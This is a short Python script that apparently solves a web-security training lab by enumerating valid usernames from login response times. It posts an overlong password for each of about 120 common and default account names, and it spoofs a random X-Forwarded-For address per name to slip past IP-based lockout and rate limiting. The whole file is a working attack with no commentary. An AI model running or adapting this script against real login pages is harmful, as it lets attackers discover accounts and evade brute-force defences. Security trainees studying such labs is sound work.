#!/usr/bin/env python3
import requests, time, random, statistics

url = "https://0a2e007c0315b34681a0d0ff00740090.web-security-academy.net/login"
password = "1dfaslfdsjfhkjsdhflkjashflkdsjflkjaskldfkslk;fjlsdjflkdjslajfdjflasjfhdlffdljdksjfjflsjfljdljsflls"
attempts_per_username = 5

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

usernames = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]
results = []

for username in usernames:
    fake_ip = random_ip()  # fixed per username
    headers = {"X-Forwarded-For": fake_ip}
    times = []

    for _ in range(attempts_per_username):
        start = time.time()
        requests.post(url, data={"username": username, "password": password}, headers=headers)
        times.append(time.time() - start)

    avg_time = statistics.mean(times)
    results.append((avg_time, username))
    print(f"{username} avg time: {avg_time:.4f}s")

# Find username with largest average time
best_avg, best_user = max(results)
print(f"Biggest avg response: {best_avg:.4f}s from {best_user}")
